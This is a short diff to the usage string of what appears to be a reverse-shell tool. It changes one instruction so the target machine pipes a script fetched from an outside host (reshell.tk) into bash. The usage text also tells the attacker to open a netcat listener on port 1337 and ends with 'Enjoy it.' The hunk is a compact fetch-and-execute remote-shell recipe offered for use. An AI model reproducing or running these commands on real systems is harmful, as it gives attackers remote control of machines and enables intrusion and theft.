@@ -14,7 +14,7 @@ usgae = \
 #      nc -l 1337
 #
 # 2. On The Target Machine:
-#      curl http://reshell.tk/ip/1337 | sh
+#      curl http://reshell.tk/ip/1337 | bash
 #
 # 3. Enjoy it.
 """
